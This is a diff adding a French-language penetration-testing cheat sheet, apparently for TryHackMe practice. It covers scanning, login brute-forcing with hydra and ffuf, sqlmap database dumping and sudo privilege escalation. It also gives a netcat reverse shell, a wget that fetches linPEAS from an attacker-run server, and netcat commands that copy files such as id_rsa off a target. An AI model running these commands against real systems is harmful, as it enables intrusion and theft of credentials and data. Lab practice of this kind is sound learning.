@@ -1,0 +1,165 @@
+Nmap :
+
+nmap -sC -sV (ip) 	--> Analyse les ports ouverts a partir d'une IP (Peux trouver des ssh, smb, ftp...)
+
+
+
+Gobuster :
+
+gobuster dir -u (ip) -w (wordlist) --> Cherche des sous-domaines de l'ip
+
+
+
+Faille Sticky Piston (FSP) :
+
+si avec ls -la on vois un s dans les droits
+  ------>		Veux dire qu'on peux executer ou utiliser de fichier/dossier avec les
+droits d'un autre utilisateur que celui sur lequel on est connecté acctuelement :
+(lister les droits --> sudo -l | executer une commande avec un autre utilisateur --> sudo -u (user) (commande))
+
+
+
+Reverse shell :
+
+Site pour generer des reverse shell : https://www.revshells.com/
+
+terminal attaquant 				: nc -lvnp (port)
+terminal victime/site attaqué 	: busybox nc (ip) (port) -e sh
+
+Pour reverse shell python, remplacer le tmp/test de la machine cible et mettre un reverse shell bash 196 dedans
+-----> sudo -u (user) /usr/bin/pip3 install /tmp/test 
+
+
+
+ssh :
+
+ssh user@ip
+
+
+
+enum4linux :
+
+enum4linux (ip) --> affiche les differents utilisateurs présents sur un serveur SMB
+
+
+
+smbclient :
+
+smbclient //(ip)/(nom du partage) -U (user) --> se connecter a un partage Samba
+
+
+
+Brute force :
+
+		Hydra (mystique) :
+
+		sudo hydra -L (wordlist username) -P (wordlist password) -u -f (ip) -s (port) http-post-form "/login.php:username=^USER^&password=^PASS:F=<form name='username'" -I
+
+
+
+		Ffuf (mystique) :
+		
+		sudo ffuf -request (wordlist[log.txt]) -request-proto http -mode clusterbomb -w (wordlist username):USERFUZZ -w (wordlist password):PASSFUZZ -mc 200
+		
+		
+
+Linepease :
+
+linepease --> sert a detecter des failles de privilege escalation, quand on a un reverse shell
+il faut installer linepease et le lancer sur la machine cible
+
+lien : https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+- installer sur le VM linepeas.sh
+- lancer un serveur python3 --> python3 -m http.server 9000
+- se deplacer dans /tmp sur le pc cible
+- aller sur le shell du pc cible --> wget http://10.11.0.201:9000/linepeas.sh
+
+Exploit-db :
+
+--> site qui répertorie des failles de systeme connues
+
+lien : https://www.exploit-db.com/
+
+
+
+Injéction sql :
+
+		Sqlmap :
+		
+		----> permet d'injecter du code malveillant sur un site contenant du sql
+		
+		toucher a l'url en remplacant un =2 par =? pour voir si il y a une faille
+		
+		sudo sqlmap -u (url/ip) --dbs --> liste toutes les bases de donnés sql rattachés a l'url/ip
+		
+		sudo sqlmap -u (url/ip) -D (database) --tables ---> affiche les tables(catégories) de la database ciblée
+		
+		sudo sqlmap -u (url/ip) -D (database) -T (table) --dump ---> récupere le contenue de la table de la DB ciblé
+		
+		(--dbs --> liste les db / --tables --> liste les tables / --columns --> liste les columns(type d'info stocké et pas contenu))
+
+
+
+
+Steghide :
+
+--> infos cachés dans une image
+
+steghide extract -sf (image.jpg)
+
+
+
+
+Gtfobins :
+
+--> aide pour savoir quoi faire a partir de certaines info
+
+line : https://gtfobins.github.io/
+
+
+
+Avoir un shell plus beau :
+
+--> faire "which python3" pour check si python3 est installé sur la machine
+--> python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+
+
+Bash bypass :
+
+--> l"s" quand ls ou certaines commandes sont bloqué par exemple dans un shell intégré dans un site web
+
+
+
+Ftp :
+
+tips --> 
+
+
+
+Récupérer un fichier sur le pc attaquant quand on a un reverse shell :
+
+par exemple pour récupérer le fichier id_rsa dans ./.ssh/id_rsa puis --> ssh user@ip -i [clé contenue dans id_rsa]
+
+dans le terminal de l'attaquant 			: nc -lvnp 9002 > ./fichier.txt
+dans le reverse shell de la machine cible 	: nc (ip) 9002 < ./fichier.txt
+
+
+
+
+OpenVpn :
+
+--> installer openvpn avec sudo (apt/dnf) install openvpn
+
+--> télécharger le .ovpn dans access sur TryHackMe
+
+--> lancer openvpn (fichier.ovpn), si c'est bon cela affichera "2024-03-28 10:29:37 Initialization Sequence Completed"
+
+--> vérifier dans access sur THM que vous etes bien connectés et c'est bon
+
+
+
+
+
